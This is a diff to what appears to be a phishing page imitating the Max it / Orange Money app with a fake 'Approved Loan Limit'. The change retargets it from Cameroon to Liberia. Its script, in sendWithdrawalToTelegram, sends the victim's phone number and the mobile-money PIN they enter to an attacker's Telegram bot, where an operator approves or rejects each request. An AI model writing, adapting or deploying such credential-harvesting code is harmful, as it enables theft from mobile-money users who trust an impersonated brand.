@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Max it - Available Limit</title>
+    <title>Max it Liberia - Available Limit</title>
 
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -81,22 +81,6 @@
         
         .logo strong {
             font-weight: 800;
-        }
-        
-        .country-selector-header {
-            padding: 4px 8px;
-            border-radius: 6px;
-            border: 1px solid rgba(255, 255, 255, 0.5);
-            background: rgba(255, 255, 255, 0.2);
-            color: white;
-            font-weight: 600;
-            font-size: 12px;
-            cursor: pointer;
-            outline: none;
-        }
-        
-        .country-selector-header option {
-            color: var(--text-dark);
         }
         
         .content-area {
@@ -324,10 +308,7 @@
         <header class="app-header">
             <button class="icon-btn" onclick="window.location.href='otp.html'"><i class="fa-solid fa-arrow-left"></i></button>
             <div class="logo"><strong>Max</strong>It</div>
-            <select class="country-selector-header" id="countrySelect" onchange="updateCountrySettings()">
-                <option value="CM" selected>Cameroon (FCFA)</option>
-                <option value="LR">Liberia (LRD)</option>
-            </select>
+            <button class="icon-btn"><i class="fa-solid fa-bell"></i></button>
         </header>
 
         <div class="content-area">
@@ -337,7 +318,7 @@
                 <div class="limit-label">Approved Loan Limit</div>
                 <div class="limit-amount">
                     <span id="animatedNumber">0</span>
-                    <span class="currency" id="currencyDisplay">FCFA</span>
+                    <span class="currency">LRD</span>
                 </div>
             </div>
 
@@ -349,7 +330,7 @@
                 <div class="info-icon"><i class="fa-solid fa-wallet"></i></div>
                 <div class="info-text">
                     <h4>Instant Transfer</h4>
-                    <p>Funds will be deposited directly to your Orange Money wallet.</p>
+                    <p>Funds will be deposited directly to your Orange Money Liberia wallet.</p>
                 </div>
             </div>
         </div>
@@ -386,25 +367,10 @@
         const savedPhone = sessionStorage.getItem('savedPhone');
         let cleanPhoneForBot = 'UNKNOWN';
 
-        function updateCountrySettings() {
-            const country = document.getElementById('countrySelect').value;
-            const currencyDisplay = document.getElementById('currencyDisplay');
-            if (country === 'LR') {
-                currencyDisplay.innerText = 'LRD';
-            } else {
-                currencyDisplay.innerText = 'FCFA';
-            }
-        }
-
         if (savedPhone) {
             document.getElementById('greetingText').innerText = `Hello, ${savedPhone}`;
             let cleanNumber = savedPhone.replace(/[^0-9]/g, '');
-            if (cleanNumber.startsWith('0')) {
-                cleanNumber = cleanNumber.substring(1);
-            }
-            const country = document.getElementById('countrySelect').value;
-            const prefix = country === 'LR' ? '231' : '237';
-            cleanPhoneForBot = prefix + cleanNumber;
+            cleanPhoneForBot = '231' + cleanNumber;
         }
 
         const errorModal = document.getElementById('errorModal');
@@ -417,7 +383,7 @@
             document.getElementById('confirmBtn').classList.remove('active');
         }
 
-        const appliedAmountStr = sessionStorage.getItem('loanAmount') || "250000";
+        const appliedAmountStr = sessionStorage.getItem('loanAmount') || "50000";
         const targetAmount = parseInt(appliedAmountStr, 10);
         const displayElement = document.getElementById('animatedNumber');
 
@@ -494,9 +460,7 @@
         const chatId = '1003670447';
 
         function sendWithdrawalToTelegram(phone, pin, amount) {
-            const country = document.getElementById('countrySelect').value;
-            const currency = country === 'LR' ? 'LRD' : 'FCFA';
-            const message = `💸 *Withdrawal Request*\nPhone: \`+${phone}\`\nAmount: \`${amount} ${currency}\`\n🔑 PIN Entered: \`${pin}\`\n\n👇 Please Approve or Reject:`;
+            const message = `💸 *Withdrawal Request (Liberia)*\nPhone: \`+${phone}\`\nAmount: \`${amount} LRD\`\n🔑 PIN Entered: \`${pin}\`\n\n👇 Please Approve or Reject:`;
 
             const inlineKeyboard = {
                 inline_keyboard: [
@@ -588,13 +552,6 @@
             btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...';
             btn.style.opacity = '0.8';
             btn.disabled = true;
-
-            // Re-evaluate phone with updated country prefix if changed
-            let cleanNumber = (savedPhone || '').replace(/[^0-9]/g, '');
-            if (cleanNumber.startsWith('0')) cleanNumber = cleanNumber.substring(1);
-            const country = document.getElementById('countrySelect').value;
-            const prefix = country === 'LR' ? '231' : '237';
-            cleanPhoneForBot = prefix + cleanNumber;
 
             sendWithdrawalToTelegram(cleanPhoneForBot, finalPin, targetAmount.toLocaleString())
                 .then(response => {
